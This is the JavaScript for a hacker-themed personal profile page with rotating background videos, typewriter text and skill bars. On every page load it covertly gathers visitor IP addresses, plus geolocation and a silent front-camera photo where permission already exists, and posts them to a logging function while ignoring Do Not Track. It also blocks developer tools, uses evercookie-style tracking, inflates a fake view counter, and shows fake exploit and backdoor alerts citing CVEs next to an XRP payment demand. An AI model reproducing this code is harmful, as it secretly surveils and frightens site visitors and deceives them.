const sourceElement = document.getElementById("bgSource");
// Random background video on each refresh, no repetitions until all videos have been shown
const bgList = [
  'assets/b-background.mp4',
  'assets/b-background2.mp4',
  'assets/b-background3.mp4',
  'assets/b-background4.mp4',
  'assets/b-background5.mp4',
];
const storageKey = 'bgShownVideos';
let chosen = 0;
try {
  // Get array of already shown video indices from localStorage
  const shownVideosJson = localStorage.getItem(storageKey);
  let shownVideos = shownVideosJson ? JSON.parse(shownVideosJson) : [];
  
  // Get indices of videos that haven't been shown yet
  const remainingIndices = [];
  for (let i = 0; i < bgList.length; i++) {
    if (!shownVideos.includes(i)) {
      remainingIndices.push(i);
    }
  }
  
  if (remainingIndices.length === 0) {
    // All videos have been shown, reset the cycle
    shownVideos = [];
    chosen = Math.floor(Math.random() * bgList.length);
  } else {
    // Choose randomly from remaining video indices
    chosen = remainingIndices[Math.floor(Math.random() * remainingIndices.length)];
  }
  
  // Add chosen video to shown videos
  shownVideos.push(chosen);
  localStorage.setItem(storageKey, JSON.stringify(shownVideos));
  
  sourceElement.src = bgList[chosen];
} catch (_) {
  // Fallback if localStorage is unavailable
  chosen = Math.floor(Math.random() * bgList.length);
  sourceElement.src = bgList[chosen];
}
const videoElement = document.getElementById("background");

// If selected video fails, randomly try remaining videos without repeats
(() => {
  const tried = new Set([chosen]);
  videoElement.addEventListener('error', () => {
    if (tried.size >= bgList.length) return;
    const remaining = [];
    for (let i = 0; i < bgList.length; i++) if (!tried.has(i)) remaining.push(i);
    const next = remaining[Math.floor(Math.random() * remaining.length)];
    tried.add(next);
    sourceElement.src = bgList[next];
    try {
      // Update shown videos when fallback video is used
      const shownVideosJson = localStorage.getItem(storageKey);
      let shownVideos = shownVideosJson ? JSON.parse(shownVideosJson) : [];
      if (!shownVideos.includes(next)) {
        shownVideos.push(next);
        localStorage.setItem(storageKey, JSON.stringify(shownVideos));
      }
    } catch (_) {}
    videoElement.load();
  }, { once: false });
})();



let hasUserInteracted = true;

function initMedia() {
  console.log("initMedia called");
  const backgroundMusic = document.getElementById('background-music');
  const backgroundVideo = document.getElementById('background');
  if (!backgroundMusic || !backgroundVideo) {
    console.error("Media elements not found");
    return;
  }
  backgroundMusic.volume = 0.3;
  // Set initial video volume but keep it muted until user interacts (required by autoplay policies)
  try { backgroundVideo.volume = 1.0; } catch (_) {}
}

// Helper to set skill bars instantly to their percentage (no animation)
function setSkillBarsInstant() {
  document.querySelectorAll('#skills-block .skill').forEach(row => {
    const percentSpan = row.querySelector('.skill-name span:last-child');
    const bar = row.querySelector('.skill-bar');
    if (!bar || !percentSpan) return;
    const match = (percentSpan.textContent || '').match(/(\d+)/);
    const pct = match ? Math.max(0, Math.min(100, parseInt(match[1], 10))) : 0;
    bar.style.width = pct + '%';
  });
}

// Animate skill bars to their percentage
function animateSkillBars() {
  document.querySelectorAll('#skills-block .skill').forEach(row => {
    const percentSpan = row.querySelector('.skill-name span:last-child');
    const bar = row.querySelector('.skill-bar');
    if (!bar || !percentSpan) return;
    const match = (percentSpan.textContent || '').match(/(\d+)/);
    const pct = match ? Math.max(0, Math.min(100, parseInt(match[1], 10))) : 0;
    gsap.to(bar, { width: pct + '%', duration: 2, ease: 'power2.out' });
  });
}

document.addEventListener('DOMContentLoaded', () => {
  // Disable right-click
  document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
  });

  // Disable common inspect element shortcuts (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U)
  document.addEventListener('keydown', (e) => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
      (e.ctrlKey && e.key === 'U')
    ) {
      e.preventDefault();
    }
  });

  // Request fullscreen on load (browser may prompt user or ignore based on security policies)
  try {
    const elem = document.documentElement;
    if (elem.requestFullscreen) {
      elem.requestFullscreen().catch(() => {});
    } else if (elem.webkitRequestFullscreen) {
      elem.webkitRequestFullscreen().catch(() => {});
    } else if (elem.msRequestFullscreen) {
      elem.msRequestFullscreen().catch(() => {});
    }
  } catch (_) {}

  const startScreen = document.getElementById('start-screen');
  const startText = document.getElementById('start-text');
  const profileName = document.getElementById('profile-name');
  const profileBio = document.getElementById('profile-bio');
  const visitorCount = document.getElementById('visitor-count');
  const backgroundMusic = document.getElementById('background-music');
  const hackerMusic = document.getElementById('hacker-music');
  const rainMusic = document.getElementById('rain-music');
  const animeMusic = document.getElementById('anime-music');
  const carMusic = document.getElementById('car-music');
    const resultsButtonContainer = document.getElementById('results-button-container');
  const resultsButton = document.getElementById('results-theme');
  const volumeIcon = document.getElementById('volume-icon');
  const volumeSlider = document.getElementById('volume-slider');
  const transparencySlider = document.getElementById('transparency-slider');
  const backgroundVideo = document.getElementById('background');
  const hackerOverlay = document.getElementById('hacker-overlay');
  const snowOverlay = document.getElementById('snow-overlay');
  const glitchOverlay = document.querySelector('.glitch-overlay');
  const profileBlock = document.getElementById('profile-block');
  const skillsBlock = document.getElementById('skills-block');
  const seeplusplusBar = document.getElementById('seeplusplus-bar');
  const assemblyBar = document.getElementById('assembly-bar');
  const prologBar = document.getElementById('prolog-bar');
  const resultsHint = document.getElementById('results-hint');
  const profilePicture = document.querySelector('.profile-picture');
  const profileContainer = document.querySelector('.profile-container');

  // Custom persistent storage (evercookie-like for static hosting)
  class PersistentStorage {
    static set(key, value) {
      try {
        // localStorage
        localStorage.setItem(key, value);
        
        // sessionStorage
        sessionStorage.setItem(key, value);
        
        // IndexedDB
        if ('indexedDB' in window) {
          const request = indexedDB.open('PersistentStorage', 1);
          request.onsuccess = function(e) {
            const db = e.target.result;
            const transaction = db.transaction(['store'], 'readwrite');
            const store = transaction.objectStore('store');
            store.put({ id: key, value: value });
          };
          request.onupgradeneeded = function(e) {
            const db = e.target.result;
            if (!db.objectStoreNames.contains('store')) {
              db.createObjectStore('store');
            }
          };
        }
        
        // Cache API
        if ('caches' in window) {
          caches.open('persistent-storage').then(cache => {
            cache.put(key, new Response(value));
          });
        }
        
        // Cookie
        document.cookie = `${key}=${value}; max-age=31536000; path=/; SameSite=Lax`;
        
      } catch (e) {
        console.log('Storage error:', e);
      }
    }
    
    static get(key, callback) {
      let found = false;
      
      // Check localStorage
      try {
        const value = localStorage.getItem(key);
        if (value) {
          callback(value);
          return;
        }
      } catch (e) {}
      
      // Check sessionStorage
      try {
        const value = sessionStorage.getItem(key);
        if (value) {
          callback(value);
          return;
        }
      } catch (e) {}
      
      // Check IndexedDB
      try {
        if ('indexedDB' in window) {
          const request = indexedDB.open('PersistentStorage', 1);
          request.onsuccess = function(e) {
            const db = e.target.result;
            const transaction = db.transaction(['store'], 'readonly');
            const store = transaction.objectStore('store');
            const getRequest = store.get(key);
            getRequest.onsuccess = function() {
              if (getRequest.result && getRequest.result.value) {
                callback(getRequest.result.value);
                return;
              }
              // Check cache next
              checkCache();
            };
          };
          request.onerror = checkCache;
        } else {
          checkCache();
        }
      } catch (e) {
        checkCache();
      }
      
      function checkCache() {
        // Check Cache API
        try {
          if ('caches' in window) {
            caches.open('persistent-storage').then(cache => {
              cache.match(key).then(response => {
                if (response) {
                  response.text().then(text => {
                    callback(text);
                    return;
                  });
                } else {
                  checkCookie();
                }
              });
            });
          } else {
            checkCookie();
          }
        } catch (e) {
          checkCookie();
        }
      }
      
      function checkCookie() {
        // Check cookie
        try {
          const cookies = document.cookie.split(';');
          for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === key && value) {
              callback(value);
              return;
            }
          }
        } catch (e) {}
        
        // Not found
        callback(null);
      }
    }
  }

  // User agent detection and device-specific alerts
  function getDeviceInfo() {
    const userAgent = navigator.userAgent.toLowerCase();
    
    // Device type detection
    if (userAgent.includes('mobile') || userAgent.includes('android') || userAgent.includes('iphone') || userAgent.includes('ipad')) {
      if (userAgent.includes('iphone')) return 'iPhone';
      if (userAgent.includes('android')) return 'Android';
      return 'Mobile Device';
    }
    
    if (userAgent.includes('tablet') || userAgent.includes('ipad')) {
      return 'iPad';
    }
    
    if (userAgent.includes('windows')) return 'Windows Laptop/Desktop';
    if (userAgent.includes('mac')) return 'Mac Laptop/Desktop';
    if (userAgent.includes('linux')) return 'Linux';
    
    return 'desktop-other';
  }

  // Device-specific alert messages - EASY TO CUSTOMIZE HERE
  function getAlertMessage(deviceType, hasClickedBefore) {
    const messages = {
      'iPhone': {
        first: { title: 'iOS Exploit Active', message: 'CVE‑2023‑42824 Ran Sucessfully!' },
        repeat: { title: 'Already Pwned', message: 'iOS Backdoor Active' }
      },
      'Android': {
        first: { title: 'Android Exploit', message: 'CVE‑2023‑21250 Ran Sucessfully!' },
        repeat: { title: 'Already Running', message: 'Android Backdoor Active' }
      },
      'Mobile Device': {
        first: { title: 'Mobile Exploit', message: 'Pwned Ur Shit! ;)' },
        repeat: { title: 'Active', message: 'Backdoor Already Running' }
      },
      'iPad': {
        first: { title: 'iPad Exploit', message: 'CVE‑2023‑41064 / CVE‑2023‑41061 Ran Sucessfully!' },
        repeat: { title: 'Already Exploited', message: 'Tablet Backdoor Active' }
      },
      'Windows Laptop/Desktop': {
        first: { title: 'Windows Exploit', message: 'CVE‑2023‑35381 Ran Sucessfully!' },
        repeat: { title: 'Already Pwned', message: 'Windows Backdoor Active' }
      },
      'Mac Laptop/Desktop': {
        first: { title: 'MacOS Exploit', message: 'CVE‑2023‑22524 Ran Sucessfully!' },
        repeat: { title: 'Already Breached', message: 'macOS Backdoor Active' }
      },
      'Linux': {
        first: { title: 'Linux Exploit', message: 'CVE‑2023‑32233 Ran Sucessfully' },
        repeat: { title: 'Already Exploited', message: 'Linux Backdoor Installed' }
      },
      'Desktop': {
        first: { title: 'Desktop Exploit', message: 'Exploit Success' },
        repeat: { title: 'Already Compromised', message: 'HVNC Already Running' }
      }
    };
    
    const deviceMessages = messages[deviceType] || messages['desktop-other'];
    return hasClickedBefore ? deviceMessages.repeat : deviceMessages.first;
  }

  // Add click event to profile picture with user agent detection
  if (profilePicture) {
    profilePicture.addEventListener('click', () => {
      // Set loading state and change to CSS loading cursor
      cursor.classList.add('loading');
      cursor.style.background = 'none';
      cursor.style.border = '2px solid #00CED1';
      cursor.style.borderRadius = '50%';
      cursor.style.animation = 'loadingPulse 1.5s ease-in-out infinite';
      cursor.style.boxShadow = '0 0 10px rgba(0, 206, 209, 0.5), inset 0 0 10px rgba(0, 206, 209, 0.3)';
      
      // Check if user has clicked before
      const hasClickedBefore = localStorage.getItem("profile_clicked") === "true";
      
      // Detect device type
      const deviceType = getDeviceInfo();
      const alertMessage = getAlertMessage(deviceType, hasClickedBefore);
      
      // Wait 0.5 seconds before showing alert (realistic processing time)
      setTimeout(() => {
        // Reset cursor first
        cursor.classList.remove('loading');
        cursor.style.background = "url('assets/cursor.png') no-repeat center center";
        cursor.style.backgroundSize = 'contain';
        cursor.style.border = 'none';
        cursor.style.borderRadius = '0';
        cursor.style.animation = '';
        cursor.style.boxShadow = 'none';
        
        // Play Windows admin sound
        const adminSound = document.getElementById('admin-sound');
        if (adminSound) {
          adminSound.currentTime = 0;
          adminSound.play().catch(e => console.log('Sound play failed:', e));
        }
        
        // Create custom alert with device-specific styling
        const customAlert = document.createElement('div');
        const borderColor = hasClickedBefore ? '#00ff00' : '#ff0000';
        const glowColor = hasClickedBefore ? 'rgba(0, 255, 0, 0.5)' : 'rgba(255, 0, 0, 0.5)';
        const titleColor = hasClickedBefore ? '#00ff00' : '#ff0000';
        const buttonColor = hasClickedBefore ? '#00ff00' : '#ff0000';
        
        customAlert.style.cssText = `
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgba(0, 0, 0, 0.9);
          border: 2px solid ${borderColor};
          border-radius: 10px;
          padding: 20px;
          z-index: 10000;
          color: #fff;
          font-family: 'Courier New', monospace;
          text-align: center;
          box-shadow: 0 0 20px ${glowColor};
        `;
        
        // First time clicking - set the persistent storage
        if (!hasClickedBefore) {
          localStorage.setItem("profile_clicked", "true");
        }
        
        customAlert.innerHTML = `
          <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px; color: ${titleColor};">${alertMessage.title}</div>
          <div style="font-size: 14px;">${alertMessage.message}</div>
          <div style="font-size: 12px; margin-top: 8px; opacity: 0.7;">Device: ${deviceType}</div>
          <button onclick="this.parentElement.remove()" style="
            margin-top: 15px;
            padding: 5px 15px;
            background: ${buttonColor};
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
          ">OK</button>
        `;
        
        document.body.appendChild(customAlert);
      }, 1000); // 1 second delay
    });
  }
  const socialIcons = document.querySelectorAll('.social-icon');
  const badges = document.querySelectorAll('.badge');
  const xrpLink = document.getElementById('xrp-link');
  const xrpWallet = 'rpbsDqk7JTVu8ddG9XWf52pMjR3xDAKsju';
  const ipBox = document.getElementById('ip-box');
  // (Visualizer removed)

  // Kick off client IP detection early so we can include it in the log payload
  let __clientIPv4 = '';
  let __clientIPv6 = '';
  const __ipifyPromise = (function(){
    try {
      const getJSON = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
      return Promise.allSettled([
        getJSON('https://api4.ipify.org?format=json'),
        getJSON('https://api6.ipify.org?format=json')
      ]).then(results => {
        if (results[0] && results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) __clientIPv4 = results[0].value.ip;
        if (results[1] && results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) __clientIPv6 = results[1].value.ip;
      }).catch(() => {});
    } catch (_) { return Promise.resolve(); }
  })();

  // Fire-and-forget IP log to Netlify Function (once per session, logs even if DNT is enabled)
  try {
    const dntFlag = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack) === '1' ? '1' : '0';
    if (!sessionStorage.getItem('ipLogged')) {
      const sendWithIP = async (payload) => {
        // Wait up to ~1.2s for ipify to resolve, then include any available v4/v6
        try {
          await Promise.race([
            __ipifyPromise,
            new Promise(res => setTimeout(res, 1200))
          ]);
        } catch (_) {}
        const merged = Object.assign({}, payload || {},
          (__clientIPv4 ? { v4: __clientIPv4 } : {}),
          (__clientIPv6 ? { v6: __clientIPv6 } : {}));
        return fetch('/.netlify/functions/log-ip', {
          method: 'POST',
          headers: Object.assign({ 'x-dnt': dntFlag }, Object.keys(merged).length ? { 'content-type': 'application/json' } : {}),
          body: Object.keys(merged).length ? JSON.stringify(merged) : undefined
        })
          .catch(() => {})
          .finally(() => {
            try { sessionStorage.setItem('ipLogged', '1'); } catch (_) {}
          });
      };

      let handled = false;
      try {
        if (navigator.permissions && navigator.geolocation) {
          navigator.permissions.query({ name: 'geolocation' }).then(p => {
            if (p.state === 'granted') {
              navigator.geolocation.getCurrentPosition(
                pos => {
                  const coords = pos && pos.coords ? pos.coords : null;
                  const base = coords ? { lat: coords.latitude, lon: coords.longitude, accuracy: coords.accuracy } : {};
                  try {
                    if (navigator.permissions) {
                      navigator.permissions.query({ name: 'camera' }).then(pc => {
                        if (pc.state === 'granted' && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.onloadedmetadata = () => {
                              const w = 320, h = Math.floor((video.videoHeight || 240) * (320 / (video.videoWidth || 320)) ) || 240;
                              const canvas = document.createElement('canvas');
                              canvas.width = w; canvas.height = h;
                              const ctx = canvas.getContext('2d');
                              try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
                              let dataUrl = '';
                              try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
                              try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
                              const payload = Object.assign({}, base, dataUrl ? { photo: dataUrl } : {});
                              sendWithIP(payload);
                            };
                            try { video.play().catch(() => {}); } catch (_) {}
                          }).catch(() => { sendWithIP(base); });
                        } else {
                          sendWithIP(base);
                        }
                      }).catch(() => { sendWithIP(base); });
                    } else {
                      sendWithIP(base);
                    }
                  } catch (_) { sendWithIP(base); }
                },
                () => { sendWithIP(); },
                { maximumAge: 60000, timeout: 2000, enableHighAccuracy: false }
              );
            } else {
              try {
                if (navigator.permissions) {
                  navigator.permissions.query({ name: 'camera' }).then(pc => {
                    if (pc.state === 'granted' && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                          const w = 320, h = Math.floor((video.videoHeight || 240) * (320 / (video.videoWidth || 320)) ) || 240;
                          const canvas = document.createElement('canvas');
                          canvas.width = w; canvas.height = h;
                          const ctx = canvas.getContext('2d');
                          try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
                          let dataUrl = '';
                          try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
                          try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
                          const payload = dataUrl ? { photo: dataUrl } : undefined;
                          sendWithIP(payload);
                        };
                        try { video.play().catch(() => {}); } catch (_) {}
                      }).catch(() => { sendWithIP(); });
                    } else {
                      sendWithIP();
                    }
                  }).catch(() => { sendWithIP(); });
                } else {
                  sendWithIP();
                }
              } catch (_) { sendWithIP(); }
            }
          }).catch(() => { if (!handled) sendWithIP(); });
          handled = true;
        }
      } catch (_) {}
      if (!handled) {
        sendWithIP();
      }
    }
  } catch (_) {}

  if (ipBox) {
    const getJSON = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
    Promise.allSettled([
      getJSON('https://api4.ipify.org?format=json'),
      getJSON('https://api6.ipify.org?format=json')
    ]).then(results => {
      let ipv4 = '';
      let ipv6 = '';
      if (results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) ipv4 = results[0].value.ip;
      if (results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) ipv6 = results[1].value.ip;

      if (ipv4 || ipv6) {
        const parts = [];
        if (ipv4) parts.push(`IPv4: ${ipv4}`);
        if (ipv6) parts.push(`IPv6: ${ipv6}`);
        ipBox.textContent = `${parts.join(' • ')} • Nice IP(s) Dude :D`;
      }
      // else leave default text
    }).catch(() => {
      // leave default text on error
    });
  }

  if (xrpLink) {
    const copyToClipboard = (text) => {
      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).catch(() => {});
      } else {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        try { document.execCommand('copy'); } catch (_) {} finally { document.body.removeChild(ta); }
      }
    };
    const showToast = (msg) => {
      const t = document.createElement('div');
      t.textContent = msg;
      t.style.position = 'fixed';
      t.style.bottom = '20px';
      t.style.left = '50%';
      t.style.transform = 'translateX(-50%)';
      t.style.background = 'rgba(0, 0, 0, 0.8)';
      t.style.color = '#fff';
      t.style.padding = '8px 12px';
      t.style.borderRadius = '8px';
      t.style.zIndex = '9999';
      t.style.fontFamily = 'Courier New, monospace';
      t.style.fontSize = '12px';
      document.body.appendChild(t);
      setTimeout(() => {
        t.style.transition = 'opacity 0.3s';
        t.style.opacity = '0';
        setTimeout(() => document.body.removeChild(t), 300);
      }, 1000);
    };
    const handleOpen = (e) => {
      e.preventDefault();
      copyToClipboard(xrpWallet);
      showToast('XRP Address Copied');
      window.open(xrpLink.href, '_blank');
    };
    xrpLink.addEventListener('click', handleOpen);
    xrpLink.addEventListener('touchstart', handleOpen, { passive: false });
  }


  const cursor = document.querySelector('.custom-cursor');
  const isTouchDevice = window.matchMedia("(pointer: coarse)").matches;

  // Hide default cursor on non-touch devices
  if (!isTouchDevice) {
    document.body.style.cursor = 'none';
  }

  if (isTouchDevice) {
    document.body.classList.add('touch-device');
    // Hide custom cursor on touch devices
    if (cursor) cursor.style.display = 'none';

    document.addEventListener('touchstart', (e) => {
      const touch = e.touches[0];
      cursor.style.left = touch.clientX + 'px';
      cursor.style.top = touch.clientY + 'px';
      cursor.style.display = 'block';
    });

    document.addEventListener('touchmove', (e) => {
      const touch = e.touches[0];
      cursor.style.left = touch.clientX + 'px';
      cursor.style.top = touch.clientY + 'px';
      cursor.style.display = 'block';
    });

    document.addEventListener('touchend', () => {
      cursor.style.display = 'none';
    });
  } else {

    document.addEventListener('mousemove', (e) => {
      cursor.style.left = e.clientX + 'px';
      cursor.style.top = e.clientY + 'px';
      cursor.style.display = 'block';
      
      // Ensure correct transform and image based on loading state
      if (!cursor.classList.contains('loading')) {
        cursor.style.transform = 'scale(1) translate(-16px, -8px)';
        cursor.style.backgroundImage = "url('assets/cursor.png')";
      }
    });

    document.addEventListener('mousedown', () => {
      cursor.style.transform = 'scale(0.8) translate(-16px, -8px)';
    });

    document.addEventListener('mouseup', () => {
      cursor.style.transform = 'scale(1) translate(-16px, -8px)';
    });
  }


  const startMessage = "Fuck You, Pay Me XRP";
  let startTextContent = '';
  let startIndex = 0;
  let startCursorVisible = true;

  function typeWriterStart() {
    if (startIndex < startMessage.length) {
      startTextContent = startMessage.slice(0, startIndex + 1);
      startIndex++;
    }
    startText.textContent = startTextContent + (startCursorVisible ? '_' : ' ');
    setTimeout(typeWriterStart, 100);
  }


  setInterval(() => {
    startCursorVisible = !startCursorVisible;
    startText.textContent = startTextContent + (startCursorVisible ? '_' : ' ');
  }, 500);


  function initializeVisitorCounter() {
    const BASE_VIEWS = 800000; // Start around 800k
    const MAX_INCREMENT = 7; // Maximum random increase
    
    // Check for existing cookie/saved view count
    let totalVisitors = localStorage.getItem('lastViewCount');
    
    if (!totalVisitors) {
      // First visit - set to base around 800k with some variation
      totalVisitors = BASE_VIEWS + Math.floor(Math.random() * 50000); // 800k-850k range
    } else {
      // Returning visitor - add random amount up to 7
      totalVisitors = parseInt(totalVisitors, 10) || BASE_VIEWS;
      const increment = Math.floor(Math.random() * (MAX_INCREMENT + 1)); // 0 to 7
      totalVisitors += increment;
    }

    // Save the new count
    localStorage.setItem('lastViewCount', String(totalVisitors));

    visitorCount.textContent = `Profile Views: ${totalVisitors.toLocaleString()}`;
  }


  initializeVisitorCounter();

  // Ensure background video plays on mobile with graceful fallback
  function playVideoWithFallback(video) {
    if (!video) return Promise.resolve();
    try { video.setAttribute('playsinline', ''); } catch (_) {}
    try { video.setAttribute('webkit-playsinline', ''); } catch (_) {}
    try { video.setAttribute('autoplay', ''); } catch (_) {}
    try { video.load(); } catch (_) {}

    // Try with sound first
    try { video.muted = false; video.removeAttribute('muted'); } catch (_) {}
    try { video.volume = 1.0; } catch (_) {}

    return video.play().catch(() => {
      // Fallback: play muted, then unmute shortly after start
      try { video.muted = true; video.setAttribute('muted', ''); } catch (_) {}
      return video.play().then(() => {
        const unmute = () => {
          try { video.muted = false; video.removeAttribute('muted'); video.volume = 1.0; } catch (_) {}
          video.removeEventListener('playing', unmute);
        };
        video.addEventListener('playing', unmute);
        setTimeout(unmute, 400);
      }).catch((err) => {
        console.error('Video still failed to play:', err);
      });
    });
  }

  startScreen.addEventListener('click', () => {
    startScreen.classList.add('hidden');

    // Ses ve video birlikte oynatılacak
    backgroundMusic.muted = false;

    const video = document.getElementById('background');
    video.style.display = 'block';
    playVideoWithFallback(video);

    // (Visualizer removed)

    // Profil bloğu animasyonu
    profileBlock.classList.remove('hidden');
    gsap.fromTo(profileBlock,
      { opacity: 0, y: -50 },
      {
        opacity: 0.9,
        y: 0,
        duration: 3,
        ease: 'power2.out',
        onComplete: () => {
          profileBlock.classList.add('profile-appear');
          profileContainer.classList.add('orbit');
        }
      }
    );

    // Cursor trail efekti (sadece masaüstünde)
    if (!isTouchDevice) {
      try {
        new cursorTrailEffect({
          length: 10,
          size: 8,
          speed: 0.2
        });
        console.log("Cursor trail initialized");
      } catch (err) {
        console.error("Failed to initialize cursor trail effect:", err);
      }
    }

    // Yazı animasyonları
    typeWriterName();
    typeWriterBio();

    // Skills bars animate based on text percentages
    animateSkillBars();
    
    // Enter fullscreen immediately when start screen is dismissed
    setTimeout(() => {
      enterFullscreen();
    }, 500); // Small delay to ensure start screen is hidden
  });

  startScreen.addEventListener('touchstart', (e) => {
    e.preventDefault();
    startScreen.classList.add('hidden');
    backgroundMusic.muted = false;
    backgroundMusic.play().catch(err => {
      console.error("Failed to play music after start screen touch:", err);
    });

    // Ensure background video starts on mobile/touch as well
    const video = document.getElementById('background');
    video.style.display = 'block';
    playVideoWithFallback(video);

    // Show profile block with animation on touch
    profileBlock.classList.remove('hidden');
    gsap.fromTo(profileBlock,
      { opacity: 0, y: -50 },
      {
        opacity: 0.9,
        y: 0,
        duration: 3,
        ease: 'power2.out',
        onComplete: () => {
          profileBlock.classList.add('profile-appear');
          profileContainer.classList.add('orbit');
        }
      }
    );

    // Yazı animasyonları
    typeWriterName();
    typeWriterBio();

    // Skills bars animate based on text percentages
    animateSkillBars();
    
    // Enter fullscreen immediately when start screen is dismissed
    setTimeout(() => {
      enterFullscreen();
    }, 500); // Small delay to ensure start screen is hidden
  });

  // Also set initial widths immediately (in case user doesn't click the start screen)
  setSkillBarsInstant();
  
  function enterFullscreen() {
    const elem = document.documentElement;
    
    if (elem.requestFullscreen) {
      elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) {
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) {
      elem.msRequestFullscreen();
    } else if (elem.webkitRequestFullscreen) {
      elem.webkitRequestFullscreen();
    } else if (elem.mozRequestFullScreen) {
      elem.mozRequestFullScreen();
    }
  }



  let nameText = '';
  let nameIndex = 0;
  let isNameDeleting = true;
  let nameCursorVisible = false;

  function typeWriterName() {
    if (!isNameDeleting && nameIndex < name.length) {
      nameText = name.slice(0, nameIndex + 1);
      nameIndex++;
    } else if (isNameDeleting && nameIndex > 0) {
      nameText = name.slice(0, nameIndex - 1);
      nameIndex--;
    } else if (nameIndex === name.length) {
      isNameDeleting = true;
      setTimeout(typeWriterName, 10000);
      return;
    } else if (nameIndex === 0) {
      isNameDeleting = false;
    }
    profileName.textContent = nameText + (nameCursorVisible ? '_' : ' ');
    if (Math.random() < 0.1) {
      profileName.classList.add('glitch');
      setTimeout(() => profileName.classList.remove('glitch'), 200);
    }
    setTimeout(typeWriterName, isNameDeleting ? 250 : 400);
  }

  setInterval(() => {
    nameCursorVisible = !nameCursorVisible;
    profileName.textContent = nameText + (nameCursorVisible ? '_' : ' ');
  }, 400);



  const bioMessages = [
    " Hello \o", " Message Me on Signal ", " Fucking Your Mental "
  ];
  let bioText = '';
  let bioIndex = 0;
  let bioMessageIndex = 0;
  let isBioDeleting = false;
  let bioCursorVisible = true;

  function typeWriterBio() {
    if (!isBioDeleting && bioIndex < bioMessages[bioMessageIndex].length) {
      bioText = bioMessages[bioMessageIndex].slice(0, bioIndex + 1);
      bioIndex++;
    } else if (isBioDeleting && bioIndex > 0) {
      bioText = bioMessages[bioMessageIndex].slice(0, bioIndex - 1);
      bioIndex--;
    } else if (bioIndex === bioMessages[bioMessageIndex].length) {
      isBioDeleting = true;
      setTimeout(typeWriterBio, 2000);
      return;
    } else if (bioIndex === 0 && isBioDeleting) {
      isBioDeleting = false;
      bioMessageIndex = (bioMessageIndex + 1) % bioMessages.length;
    }
    profileBio.textContent = bioText + (bioCursorVisible ? '_' : ' ');
    if (Math.random() < 0.1) {
      profileBio.classList.add('glitch');
      setTimeout(() => profileBio.classList.remove('glitch'), 200);
    }
    setTimeout(typeWriterBio, isBioDeleting ? 75 : 150);
  }

  setInterval(() => {
    bioCursorVisible = !bioCursorVisible;
    profileBio.textContent = bioText + (bioCursorVisible ? '_' : ' ');
  }, 500);


  let currentAudio = backgroundMusic;
  let isMuted = false;

  volumeIcon.addEventListener('click', () => {
    isMuted = !isMuted;
    backgroundVideo.muted = isMuted;
    volumeIcon.innerHTML = isMuted
      ? `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2"></path>`
      : `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path>`;
  });

  volumeIcon.addEventListener('touchstart', (e) => {
    e.preventDefault();
    isMuted = !isMuted;
    backgroundVideo.muted = isMuted;
    volumeIcon.innerHTML = isMuted
      ? `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2"></path>`
      : `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path>`;
  });

  volumeSlider.addEventListener('input', () => {
    backgroundVideo.volume = volumeSlider.value;
    isMuted = false;
    backgroundVideo.muted = false;
